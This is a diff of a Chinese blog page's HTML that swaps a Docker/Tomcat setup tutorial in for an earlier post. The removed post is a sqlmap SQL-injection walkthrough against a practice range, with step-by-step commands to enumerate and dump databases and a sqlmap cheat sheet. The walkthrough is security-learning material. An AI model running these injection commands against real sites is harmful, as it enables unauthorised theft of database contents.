@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="（二）SQL注入—sqlmap注入, Wkai">
+    <meta name="keywords" content="用docker部署tomcat环境, Wkai">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>（二）SQL注入—sqlmap注入 | Wkai</title>
+    <title>用docker部署tomcat环境 | Wkai</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -201,12 +201,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(1).png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(4).png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">（二）SQL注入—sqlmap注入</h1>
+                    <h1 class="description center-align post-title">用docker部署tomcat环境</h1>
                 </div>
             </div>
         </div>
@@ -323,8 +323,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/sqlmap/">
-                                <span class="chip bg-color">sqlmap</span>
+                            <a href="/tags/docker/">
+                                <span class="chip bg-color">docker</span>
                             </a>
                         
                     </div>
@@ -335,8 +335,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
-                                SQL注入
+                            <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-category">
+                                环境搭建
                             </a>
                         
                     </div>
@@ -348,7 +348,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-08-05
+                    2020-08-10
                 </div>
                 
 
@@ -364,86 +364,48 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <ul>
-<li>上篇我们说到如何利用报错信息进行sql注入，那么本篇我们将会使用工具sqlmap对网站进行爆库</li>
-<li>还是上篇的靶场，靶场由<a href="https://zhishihezi.net/box/" target="_blank" rel="noopener">知识盒子</a>提供，地址：<a href="https://tofu.exeye.run/sql/log_page" target="_blank" rel="noopener">https://tofu.exeye.run/sql/log_page</a></li>
+                <h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><ul>
+<li>最近因为想学习下jsp，所以需要学习tomcat的部署，但是整来整去，发现还是docker香，所以我索性就用docker来搭建这个环境了，顺便复习波docker的使用</li>
 </ul>
-<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(5).png" alt="登录界面"></p>
-<ul>
-<li>因为登录发出的是POST请求，所以我们首先需要用burp先开启抓包，随便输入用户名和密码，点击登录</li>
+<h5 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h5><ul>
+<li>首先我们选择一个好的镜像，好的镜像很重要，可以通过关键词搜索自己想要的镜像</li>
 </ul>
-<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(2).png" alt="网站发起的POST请求"></p>
-<ul>
-<li>然后将POST请求复制到记事本里保存为1.txt</li>
+<pre><code>docker search tomcat</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(2).png" alt></p>
+<h5 id="选取star最高的镜像"><a href="#选取star最高的镜像" class="headerlink" title="选取star最高的镜像"></a>选取star最高的镜像</h5><ul>
+<li>将镜像pull下来</li>
 </ul>
-<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(4).png" alt></p>
-<ul>
-<li><p>然后在当前目录开启终端，需要用到的命令为</p>
-</li>
-<li><pre><code>sqlmap -r &quot;1.txt&quot; -p psw --dbs           
--p参数意思是指定参数psw进行注入，因为上篇我们手动测试到密码处有注入点
---dbs的意思是爆出数据库名称</code></pre></li>
+<pre><code>docker pull tomcat</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(5).png" alt></p>
+<h5 id="查看是否成功下载到镜像"><a href="#查看是否成功下载到镜像" class="headerlink" title="查看是否成功下载到镜像"></a>查看是否成功下载到镜像</h5><pre><code>docker images</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(7).png" alt></p>
+<h5 id="指定端口运行容器"><a href="#指定端口运行容器" class="headerlink" title="指定端口运行容器"></a>指定端口运行容器</h5><pre><code>docker run -d -p 6556:8080 tomcat
+参数-d 后台运行容器
+参数-p 指定端口映射 6556:8080 就是将容器的8080短裤映射到本地的6556端口，通过6556端口就能访问网页了</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(6).png" alt></p>
+<h5 id="查看容器ID"><a href="#查看容器ID" class="headerlink" title="查看容器ID"></a>查看容器ID</h5><pre><code>docker ps -a</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(1).png" alt></p>
+<h5 id="进入到容器里"><a href="#进入到容器里" class="headerlink" title="进入到容器里"></a>进入到容器里</h5><pre><code>docker exec -it d71a17108efe /bin/bash
+d71a17108efe 容器的ID
+-i: 交互式操作
+-t: 终端</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(9).png" alt></p>
+<h5 id="tomcat里的配置"><a href="#tomcat里的配置" class="headerlink" title="tomcat里的配置"></a>tomcat里的配置</h5><ul>
+<li>删除文件夹webapps</li>
 </ul>
+<pre><code>rm -rf webapps</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(10).png" alt></p>
 <ul>
-<li>运行该命令，爆出数据库的所有库名</li>
+<li>将webapps.dist修改为webapps</li>
 </ul>
-<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(1).png" alt="sqlmap正在尝试注入"></p>
-<ul>
-<li>成功爆出两个库名，<code>information_schema</code>和<code>twosecu1_ques_2</code></li>
+<pre><code>mv webapps.dist webapps        记住一定要先删除webapps，否则将会把webapps.dist移到webapps文件夹里</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(8).png" alt></p>
+<h5 id="重启容器"><a href="#重启容器" class="headerlink" title="重启容器"></a>重启容器</h5><ul>
+<li>先exit退出容器，回到docker的控制端</li>
 </ul>
-<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(6).png" alt></p>
+<pre><code>docker restart d71a17108efe</code></pre><p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard.png" alt></p>
 <ul>
-<li><p>接下来选择一个数据库继续深入，我选择的是库<code>information_schema</code>，查看有哪些表，运行命令为：</p>
-</li>
-<li><pre><code>sqlmap -r &quot;1.txt&quot; -p psw -D information_schema --tables
--D的参数是指定数据库名
---tables参数意思是列出数据库的所有表名</code></pre></li>
+<li>再查看下运行状态，确定容器在运行中</li>
 </ul>
-<ul>
-<li>运行命令，可以得到指定数据库的所有表名</li>
+<p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(3).png" alt></p>
+<h5 id="访问浏览器"><a href="#访问浏览器" class="headerlink" title="访问浏览器"></a>访问浏览器</h5><ul>
+<li>打开浏览器访问127.0.0.1:6556</li>
 </ul>
-<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(3).png" alt></p>
-<ul>
-<li><p>同理，获得一个表名之后我们也可以指定他的字段,比如列出表<code>ALL_PLUGINS</code>的字段</p>
-</li>
-<li><pre><code>sqlmap -r &quot;1.txt&quot; -p psw -D information_schema -T ALL_PLUGINS --columns
-参数-T是指定表名的意思
---columns 列出指定表的所有字段</code></pre></li>
-</ul>
-<ul>
-<li>运行命令，查看<code>ALL_PLUGINS</code>的字段</li>
-</ul>
-<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard.png" alt></p>
-<ul>
-<li><p>最后就是爆出字段的内容了，运行命令为：</p>
-</li>
-<li><pre><code>sqlmap -r &quot;1.txt&quot; -p psw -D information_schema -T ALL_PLUGINS -C PLUGIN_LIBRARY --dump
-参数-C 用于指定字段名
---dump 爆出字段的值</code></pre></li>
-</ul>
-<ul>
-<li>运行命令，就能列出该字段的所有值了</li>
-</ul>
-<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(7).png" alt></p>
-<ul>
-<li>所以只要有注入点，就能够指定参数，用sqlmap就能很方便地列出数据库所有的数据。</li>
-</ul>
-<br>
-
-<ul>
-<li><p>拓展：sqlmap常用命令</p>
-<p>检查注入点 </p>
-<pre><code>sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; </code></pre><br>
-
-<p>列数据库信息 </p>
-<pre><code>sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; --dbs </code></pre><p><br>指定数据库名列出所有表</p>
-<pre><code> sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; -D dbsname --tables </code></pre><p><br>指定数据库名表名列出所有字段</p>
-<pre><code> sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; -D dbsname -T tablename --columns </code></pre><p><br>指定数据库名表名字段dump出指定字段</p>
-<pre><code>sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; -D dbsname -T tablename -C columnname --dump </code></pre><p><br>cookie 注入      </p>
-<pre><code>--cookie=COOKIE                 在需要登录的地方，需要登录后的cookie </code></pre><p><br>执行指定的 SQL 语句 </p>
-<pre><code>--sql-query=QUERY </code></pre><p><br>代理注入</p>
-<pre><code> --proxy=&quot;(http|https|socks4|socks5)://127.0.0.1:8087&quot;    支持多种协议</code></pre><p><br>POST注入</p>
-<pre><code>sqlmap -r 1.txt                     如果cookie很长，或者需要使用post注入，请抓包将数据存入1.txt中</code></pre></li>
+<p><img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(4).png" alt></p>
+<h5 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h5><ul>
+<li>最后就没有最后了，记得好好学jsp</li>
 </ul>
 
             </div>
@@ -470,7 +432,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wkaiblog.cn/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/">http://wkaiblog.cn/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/</a>
+                    <a href="http://wkaiblog.cn/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/">http://wkaiblog.cn/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -508,8 +470,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/sqlmap/">
-                                    <span class="chip bg-color">sqlmap</span>
+                                <a href="/tags/docker/">
+                                    <span class="chip bg-color">docker</span>
                                 </a>
                             
                         </div>
@@ -677,9 +639,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/">
                     <div class="card-image">
@@ -700,9 +663,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -715,6 +678,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -733,25 +697,29 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/">
+                <a href="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
                         
-                        <img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(8).png" class="responsive-img" alt="（一）SQL注入—基础">
+                        <img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(1).png" class="responsive-img" alt="（二）SQL注入—sqlmap注入">
                         
-                        <span class="card-title">（一）SQL注入—基础</span>
+                        <span class="card-title">（二）SQL注入—sqlmap注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             
-在SQL注入的过程中，如果网站的Web服务器开启了错误回显，则会为攻击者提供极大的便利，比如攻击者在参数中输入一个单引号&#39;， 引起执行查询语句的语法错误，服务器直接返回了错误信息。
-下面我们来看个例子    靶场由知识盒子提供，地
+上篇我们说到如何利用报错信息进行sql注入，那么本篇我们将会使用工具sqlmap对网站进行爆库
+还是上篇的靶场，靶场由知识盒子提供，地址：https://tofu.exeye.run/sql/log_page
+
+
+
+因为登录发出的是POS
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-31
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-05
                             </span>
                         <span class="publish-author">
                             
@@ -764,6 +732,14 @@
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sqlmap/">
+                        <span class="chip bg-color">sqlmap</span>
+                    </a>
+                    
                 </div>
                 
             </div>
